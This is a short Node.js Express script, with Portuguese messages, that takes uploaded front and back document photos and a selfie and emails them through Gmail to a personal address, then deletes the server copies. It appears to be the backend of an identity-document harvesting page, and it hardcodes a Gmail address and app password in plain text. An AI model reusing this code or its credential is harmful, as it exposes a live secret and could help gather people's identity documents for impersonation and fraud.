const express = require("express");
const multer = require("multer");
const nodemailer = require("nodemailer");
const fs = require("fs");
const path = require("path");

const app = express();
const upload = multer({ dest: "uploads/" });

const EMAIL = "saresende5555@gmail.com"; 
const PASSWORD = "nlaa nylc ddic dhmy";

const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: EMAIL,
    pass: PASSWORD,
  },
});

app.use(express.static("public"));

app.post(
  "/upload",
  upload.fields([
    { name: "frontPhoto", maxCount: 1 },
    { name: "backPhoto", maxCount: 1 },
    { name: "selfiePhoto", maxCount: 1 },
  ]),
  async (req, res) => {
    try {
      const { frontPhoto, backPhoto, selfiePhoto } = req.files;

      if (!frontPhoto || !backPhoto || !selfiePhoto) {
        return res.status(400).send("Todas as fotos são obrigatórias.");
      }

      const attachments = [
        {
          filename: frontPhoto[0].originalname,
          path: frontPhoto[0].path,
        },
        {
          filename: backPhoto[0].originalname,
          path: backPhoto[0].path,
        },
        {
          filename: selfiePhoto[0].originalname,
          path: selfiePhoto[0].path,
        },
      ];

      const mailOptions = {
        from: EMAIL,
        to: "saresende555@gmail.com",
        subject: "Novas fotos enviadas",
        text: "As fotos foram enviadas com sucesso!",
        attachments,
      };

      await transporter.sendMail(mailOptions);

      
      attachments.forEach((file) => fs.unlinkSync(file.path));

      res.send("Fotos enviadas com sucesso!");
    } catch (error) {
      console.error("Erro ao processar o upload:", error);
      res.status(500).send("Erro ao enviar as fotos.");
    }
  }
);

const PORT = 3000;
app.listen(PORT, () => {
  console.log(`Servidor rodando em http://localhost:${PORT}`);
});